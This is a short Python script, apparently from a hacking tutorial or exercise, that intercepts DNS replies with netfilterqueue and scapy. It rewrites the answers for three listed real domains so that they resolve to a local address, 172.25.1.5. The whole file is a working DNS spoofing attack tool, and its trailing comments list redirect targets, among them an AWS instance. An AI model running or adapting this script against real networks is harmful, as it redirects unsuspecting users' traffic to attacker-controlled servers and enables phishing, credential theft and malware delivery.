#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

websites = ["one.sjsu.edu", "www.winzip.com", "nytimes.com"]

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        for website in websites:
            if website in qname:
                print(" Spoofing Target")
                answer = scapy.DNSRR(rrname=qname, rdata="172.25.1.5")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
                packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#66.254.114.41 ph
#104.85.160.39 winzip
#172.25.1.5 local site
#3.80.104.191 AWS instance

